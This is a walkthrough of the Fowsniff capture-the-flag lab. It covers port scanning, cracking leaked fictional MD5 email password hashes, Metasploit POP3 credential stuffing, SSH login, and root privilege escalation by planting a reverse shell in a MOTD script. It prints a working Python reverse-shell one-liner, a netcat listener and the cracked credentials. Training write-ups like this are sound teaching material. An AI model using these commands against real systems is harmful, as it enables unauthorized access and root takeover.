# [Fowsniff CTF](https://tryhackme.com/r/room/ctf)

This CTF provides an attack box and walks you through most of it. Most of the questions don't require answers, but in this walkthrough we'll explain our methodology and solutions to them. 

<details>
<summary> <b>Deploy the machine. On the top right of this you will see a Deploy button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.</b> </summary>
This is pretty straightforward. We press the Start Machine button, which the image below shows is grayed out once I clicked it.

![image](image.png)  

Cool. We then start our attack box and wait for it to load before proceeding.
</details>
<details>
<summary> <b>Using nmap, scan this machine. What ports are open?</b> </summary>  
We'll do a simple nmap scan. Nmap is powerful, and we can take our time scanning, but this is a simple CTF, so let's not overcomplicate it. The IP is provided to us after about a minute since the CTF machine is launched. Note that your IP may differ from mine.

![image](image-1.png)  

Solution: <b>Ports 22, 80, 110, and 143 are open.</b>
</details>
<details>
<summary> <b>Using the information from the open ports. Look around. What can you find?</b> </summary>  
I assume this is just asking if we see anything interesting about these protocols. SSH is a secure connection protocol. The rest are insecure versions of email (POP and IMAP) and web requests (HTTP). If we attempt to SSH, we can actually get in:  

![image](image-2.png)  
Unfortunately, it's password protected. Darn. Well, HTTP is another option. Opening up a browser and typing `10.10.252.0:80` (port number optional) will pull up the website, with some interesting information:  
![image](image-3.png)
Wowie, a credential leak. So this CTF is telling a story, cool. This may lead us to answering the next question.
</details>
<details>
<summary> <b>Using Google, can you find any public information about them?</b> </summary>  
Google search the corporation, they have a Twitter account (and many write-ups that could make it hard to actually focus on the CTF itself):  

![image](image-4.png)
Access the pastebin link and...

![alt text](image-5.png)
Well...this is not part of the CTF. You're supposed to get the passwords here. This is yet another CTF that attempts to make the user use their OSINT skills, only to fall flat.  
Fortunately, the Twitter account does show 'stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd' in one of its posts, but we need the others. This is extremely frustrating, as it requires you to read a write-up to gather the needed information. Here's the original pastebin in case you need it, and don't want to look any further:  

```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!


mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

l8r n00bz!

B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.

Any similarities to actual people or entities is purely coincidental and occurred accidentally.
```

</details>
<details>
<summary> <b>Can you decode these md5 hashes? You can even use sites like hashkiller to decode them.</b> </summary>  
Normally, I would use hashcat, but let's try this online website they suggest. It initially looks like you need to create an account, but if you migrate to "Hash Cracker" and select "MD5 Cracker", you can use this for free.  

![alt text](image-6.png)
Throw those bad boys in there with the names removed and you'll get results:

![alt text](image-7.png)
For a nice text format in case you have trouble using an MD5 cracker, here it is:  

```
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb:skyler22
tegel@fowsniff:1dc352435fecca338acfd4be10984009:apples01
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11:orlando12
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4:mailcall
seina@fowsniff:90dc16d47114aa13671c697fd506cf26:scoobydoo2
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e:07011972
```

</details>
<details>
<summary> <b>Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?</b> </summary>
In other words, it wants us to use credential stuffing on the POP3 server. Let's do it. You can access Metasploit by navigating to the Tools folder, or by typing 'msfconsole':  

![alt text](image-8.png)

Metasploit is a framework with a lot of built-in exploits. Googling 'metasploit pop3 credential stuffing' pulls up the command to do the attack we want to do. Script Kiddie: 1, Defensive Cyber Operator: 0.  

> msf > use auxiliary/scanner/pop3/pop3_login  

Run 'show options', and you will see we can create a file with usernames and passwords separated by a space to execute. We must also specify the receiving host (RHOST). Normally, RPORT must also be secified, but since this is a POP3 attack, Metasploit has already set this to our desired port 110.  

![alt text](image-9.png)

![alt text](image-10.png)

Enough monkeying around. Let's set the RHOST to 10.10.85.111 (my box's IP changed during this write-up) and USERPASS_FILE to the path of our modified user/pass file. You may also need to remove the USER_FILE and PASS_FILE settings, as it may attempt to check these before your actual list.

```
msf auxiliary(scanner/pop3/pop3_login) > set RHOST {target IP}
msf auxiliary(scanner/pop3/pop3_login) > set USERPASS_FILE ~/Desktop/userfile
msf auxiliary(scanner/pop3/pop3_login) > set USER_FILE ""
msf auxiliary(scanner/pop3/pop3_login) > set PASS_FILE ""
```

![alt text](image-11.png)

Winner winner chicken dinner.
</details>
<details>
<summary> <b>What was seina's password to the email service?</b> </summary>
This is what we obtained in the last question.  

Solution: <b>scoobydoo2</b>
</details>
<details>
<summary> <b>Can you connect to the pop3 service with her credentials? What email information can you gather?</b> </summary>
Why yes, we can use her credentials. We can login using telnet and specifying the POP3 protocol, then entering her username and password. The trick to all this is just knowing POP3 commands.

![alt text](image-12.png)

List the messages, and we see the ID of each one.

![alt text](image-13.png)

Using the `retr <id>` command, we can view these messages. The first one talks about how easy it was to use SQL injection on the site. It also gives a temporary password to use SSH:

![alt text](image-14.png)

This is why we couldn't break that hash from earlier. The second email is less interesting, sent by the user 'Skyler' whose username is 'baksteen'. He appears to not have read the first email sent in mass to everyone to change their SSH passwords. I wonder what we could do with this information...

![alt text](image-15.png)


</details>
<details>
<summary> <b>In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.</b> </summary>

This question is worded weirdly, in the sense that it discourages the attacker to pay attention to the narrative. I interpreted this question thinking since Stone sent the password, we should connect with him, but the correct narrative being told is that Skyler (baksteen) hadn't changed his password yet, so we need to SSH as him.

![alt text](image-16.png)

Welcome back, baksteen.
</details>
<details>
<summary> <b>Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?</b> </summary>

Feel free to look around. Users can be found using `id -nG`.

![alt text](image-17.png)

Welp, that's about the groups we would expect. We can do a search `find / -type f -perm -u=rwx 2>/dev/null` to find files that we can write and execute as a user. The ending here ignores errors. The problem with this question is that there's a buttload of them:

![alt text](image-18.png)

The one they expect you to be interested in is `/opt/cube/cube.sh`. This contains the MOTD banner. It makes sense in hindsight, as when you login, this program will be ran and we can execute a malicious program with it. Unfortunately, most users won't know how to look for that for a beginner CTF. As much hand holding as this CTF does for you, I only knew it was this file in particular because of another write-up that the CTF references.
</details>
<details>
<summary> <b>Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?</b> </summary>

Well, it gives us the python code to execute a reverse shell:
> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

So yes, just copy and paste this into the `cube.sh` file. Make sure to replace `<IP>` with your actual IP, which the attack box has within the user's name. If you're still unsure, do a simple `ifconfig`.

![alt text](image-19.png)
</details>
<details>
<summary> <b>If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in /etc/update-motd.d/ file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!</b> </summary>

We actually don't need to do anything here. By going to `/etc/update-motd.d/` and then `00-banner`, we see that `sh /opt/cube/cube.sh` is already executing our code.

![alt text](image-20.png)

This also brings to light how we may have known to look at `/opt/cube/cube.sh` from the earlier question. Essentially, we would look to find a privilege escalation vulnerability with the MOTD banner. I would argue this is a bit of a niche vulnerability for a CTF that requires almost no answers and practically gives you commands, so I leave this write-up in the perspective of you, the user, rather than just writing as if I knew perfectly how the CTF creator wanted this exercise to go.
</details>

<details>
<summary> <b>Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!</b> </summary>

Here's the home run. If we did everything right, we should get a reverse shell from our netcat listener upon a fresh SSH login:

![alt text](image-21.png)

![alt text](image-22.png)

![alt text](image-23.png)

Voila. I'll admit, I don't mind this hand holding bit, as it effectively walks you through how to make your own reverse shell.
</details>
<details>
<summary> <b>If you are really really stuck, there is a brilliant walkthrough here: https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/ 

If its easier, follow this walkthrough with the deployed machine on the site.</b> </summary>

This doesn't require anything. We're done. Shoo. Get out of here.
</details>